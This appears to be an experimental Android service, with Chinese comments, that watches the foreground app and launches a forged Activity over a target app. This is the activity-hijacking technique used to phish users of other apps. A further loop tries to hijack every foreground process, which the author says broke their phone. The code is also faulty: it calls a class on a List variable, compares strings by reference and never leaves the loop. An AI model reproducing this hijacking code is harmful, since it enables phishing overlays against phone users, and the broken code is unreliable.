package com.example.crakebroadcast;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;

import android.app.ActivityManager;
import android.app.ActivityManager.RunningAppProcessInfo;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;
import android.widget.Toast;

public class hijackservice extends Service {
	List<String> hajacklist = new ArrayList<String>();
	Handler handler = new Handler();
	HashMap<String, Class<?>> targetMap = new HashMap<String, Class<?>>();

	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public void onCreate() {
		// TODO Auto-generated method stub
		super.onCreate();
		// 初始化被劫持的进程

		handler.postDelayed(searchTarget, 1000);

	}

	@Override
	public void onStart(Intent intent, int startId) {
		// 将我们的目标加入targetMap中
		// 这里，key为我们的目标进程，value为我们伪造的Activity
		targetMap.put("com.example.broadcasttest", MainActivity.class);
		inithijackprocess();// 启动searchTarget
		handler.postDelayed(searchTarget, 1000);

	}

	// 开启一个线程用来劫持对象每隔200秒执行一次
	final Runnable searchTarget = new Runnable() {
		@Override
		public void run() {
			// TODO Auto-generated method stub
			// 拿到activityManager管理器
			ActivityManager aManager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
			// 枚举当前正在运行的进程
			List<RunningAppProcessInfo> infos = aManager.getRunningAppProcesses();
			Toast.makeText(getApplicationContext(), "this is", 0).show();
			for (RunningAppProcessInfo psinfo : infos) {
				// 正在运行的前台进程
				  if (psinfo.importance == RunningAppProcessInfo.IMPORTANCE_FOREGROUND) {
String string=psinfo.processName;
					  Toast.makeText(getApplicationContext(), string, 0).show();

					System.out.println("2");
					//劫持broadcast进程
					if (targetMap.containsKey(psinfo.processName)) {
						System.out.println("1");
						Toast.makeText(getApplicationContext(), "this was", 0).show();
						Log.d("com.droider.hijack", "hijacking");
						Intent intent = new Intent(getApplicationContext(), hajacklist.class);
						intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
						intent.putExtra("processname", psinfo.processName);
						// 启动伪造的activity
						getApplication().startActivity(intent);

					}

			//劫持所有进程---搞废了我的手机
					while (psinfo.processName!="com.example.crakebroadcast") {
						Toast.makeText(getApplicationContext(), "hijackall", 0).show();
						Log.d("com.droider.hijack", "hijacking");
						Intent intent = new Intent(getApplicationContext(), hajacklist.class);
						intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
						intent.putExtra("processname", psinfo.processName);
						// 启动伪造的activity
						getApplication().startActivity(intent);
					}
					
				}
			}
			 handler.postDelayed(searchTarget, 2000);
		}
	};

	private void inithijackprocess() {
		// TODO Auto-generated method stub
		//targetMap.put("com.example.broadcasttest", MainActivity.class);
	}

}
